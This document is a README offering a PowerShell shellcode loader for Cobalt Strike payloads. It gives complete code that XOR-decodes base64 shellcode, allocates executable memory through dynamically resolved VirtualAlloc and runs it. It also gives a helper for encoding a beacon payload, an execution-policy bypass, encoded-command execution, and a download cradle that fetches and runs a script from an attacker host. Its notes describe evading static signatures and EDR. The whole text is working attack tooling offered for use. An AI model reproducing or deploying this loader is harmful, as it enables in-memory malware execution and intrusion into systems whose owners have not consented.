# PowerShell Shellcode Loader

Reflective PowerShell loader for Cobalt Strike shellcode. Uses dynamic delegate creation to avoid static imports.

---

## Usage

1. Generate shellcode in Cobalt Strike: **Attacks > Packages > Payload Generator**
2. Select listener and output format (Raw or Base64)
3. XOR encode the shellcode (key: 35 in this example)
4. Replace the base64 string in `$v` variable

---

## Loader (x64)

```powershell
Set-StrictMode -Version 2

function func_get_proc_address {
    param(
        [string]$var_module,
        [string]$var_procedure
    )
  
    Add-Type @"
using System;
using System.Runtime.InteropServices;
  
public static class NativeMethods {
    [DllImport("kernel32", SetLastError=true)]
    public static extern IntPtr GetModuleHandle(string moduleName);
  
    [DllImport("kernel32", SetLastError=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);
}
"@
    $hModule = [NativeMethods]::GetModuleHandle($var_module)
    if ($hModule -eq [IntPtr]::Zero) { return $null }
    $ptr = [NativeMethods]::GetProcAddress($hModule, $var_procedure)
    return $ptr
}

function func_get_delegate_type {
    param(
        [Parameter(Mandatory=$true)]
        [Type[]] $var_parameters,
        [Type] $var_return_type = [Void]
    )

    $assemblyName = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $assemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        $assemblyName,
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
    )

    $moduleBuilder = $assemblyBuilder.DefineDynamicModule('InMemoryModule', $false)

    $typeBuilder = $moduleBuilder.DefineType(
        'MyDelegateType',
        'Class, Public, Sealed, AnsiClass, AutoClass',
        [System.MulticastDelegate]
    )

    $ctor = $typeBuilder.DefineConstructor(
        'RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard,
        $var_parameters
    )
    
    $ctor.SetImplementationFlags('Runtime, Managed')

    $invokeMethod = $typeBuilder.DefineMethod(
        'Invoke',
        'Public, HideBySig, NewSlot, Virtual',
        $var_return_type,
        $var_parameters
    )

    $invokeMethod.SetImplementationFlags('Runtime, Managed')

    return $typeBuilder.CreateType()
}

If ([IntPtr]::size -eq 8) {
    # Replace with your XOR-encoded (key=35) base64 shellcode
    [Byte[]]$v = [System.Convert]::FromBase64String('YOUR_BASE64_SHELLCODE_HERE')

    # XOR decode
    $i = 0
    while (-not ($i -ge $v.Count)) {
        $v[$i] = $v[$i] -bxor 35
        $i += 1
    }

    # Get pointer to VirtualAlloc
    $va_ptr = func_get_proc_address "kernel32.dll" "VirtualAlloc"
    if ($va_ptr -eq [IntPtr]::Zero) {
        throw "GetProcAddress failed for VirtualAlloc"
    }

    # Build delegate type: (IntPtr, UInt32, UInt32, UInt32) -> IntPtr
    $va_delegate_type = func_get_delegate_type `
        @([IntPtr], [UInt32], [UInt32], [UInt32]) `
        ([IntPtr])

    # Convert pointer to delegate
    $var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        $va_ptr,
        $va_delegate_type
    )

    # Allocate RWX memory
    $var_buffer = $var_va.Invoke(
        [IntPtr]::Zero,
        $v.Length,
        0x3000,   # MEM_COMMIT | MEM_RESERVE
        0x40      # PAGE_EXECUTE_READWRITE
    )

    if ($var_buffer -eq [IntPtr]::Zero) {
        throw "VirtualAlloc returned NULL"
    }

    # Copy shellcode to allocated memory
    [System.Runtime.InteropServices.Marshal]::Copy($v, 0, $var_buffer, $v.Length)

    # Create delegate for shellcode entry point
    $runme_delegate_type = func_get_delegate_type @([IntPtr]) ([Void])
    $var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        $var_buffer,
        $runme_delegate_type
    )

    # Execute shellcode
    $var_runme.Invoke([IntPtr]::Zero)
}
```

---

## XOR Encoding Helper

Encode your raw shellcode before base64 encoding:

```powershell
# Read raw shellcode
$bytes = [System.IO.File]::ReadAllBytes("C:\Payloads\beacon.bin")

# XOR with key 35
for ($i = 0; $i -lt $bytes.Length; $i++) {
    $bytes[$i] = $bytes[$i] -bxor 35
}

# Convert to base64
$encoded = [System.Convert]::ToBase64String($bytes)
$encoded | Out-File "C:\Payloads\beacon_encoded.txt"
```

---

## Execution Methods

### Direct Execution
```powershell
powershell -ep bypass -f loader.ps1
```

### Download Cradle
```powershell
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/loader.ps1')"
```

### Encoded Command
```powershell
# Encode script
$script = Get-Content loader.ps1 -Raw
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$encoded = [System.Convert]::ToBase64String($bytes)

# Execute
powershell -ep bypass -enc $encoded
```

---

## Notes

- Only works on x64 systems (check `[IntPtr]::size -eq 8`)
- XOR key can be changed (update both encoder and decoder)
- Uses dynamic type creation to avoid static P/Invoke signatures
- VirtualAlloc allocates RWX memory (may trigger some EDR)
